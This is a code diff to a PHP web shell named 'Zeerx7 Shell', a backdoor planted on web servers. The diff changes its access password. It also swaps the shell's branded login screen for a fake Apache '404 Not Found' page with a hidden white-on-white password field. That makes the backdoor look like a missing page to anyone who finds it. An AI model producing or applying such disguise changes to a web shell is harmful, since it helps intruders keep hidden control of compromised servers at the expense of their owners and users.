@@ -27,7 +27,7 @@ error_reporting(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$MyPass = 'z7'; // Password Default: z7
+$MyPass = 'cornetto7'; // Password Default: z7
 function dup($pass,$n){
 if($_GET['pass'] == $pass){
 $f =  __FILE__;
@@ -616,35 +616,23 @@ function pausi_tampilkan()
 function pausi_login()
 {
     global $MyPass;
-    echo "  <title>{ Zeerx7 Shell }</title>
+    echo "<html><title>404 Not Found</title>
   <meta name='viewport' content='width=device-width, initial-scale=1'>
   <style type='text/css'>
   body {
-    background: black;
-    color: #00FF00;
+    background: white;
+    color: #000000;
   }
     input{
     border:0;
-    border:1px solid #900;
-    background:black;
-    color: gold;
-  }
-  </style><center><br><br>
-  <pre>
-   / \       _-'
-  /|  \-''- _ /
- { |          \
-/             \
-/       \"o.  |o }
-|            \ ;
-\             ',
- --\_         __\
-     ''-_    \.//
-        '-____'
-  </pre>
+    border:0px solid #000000;
+    background:white;
+    color: white;
+  }</style>
+  <h1>Not Found</h1><p>The requested URL was not found on this server.<p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
   <form method='POST'>
     <input type='password' name='pw'>
-  </form>
+  </form></html>
 ";
     session_start();
     if ($_POST['pw'] == $MyPass) {
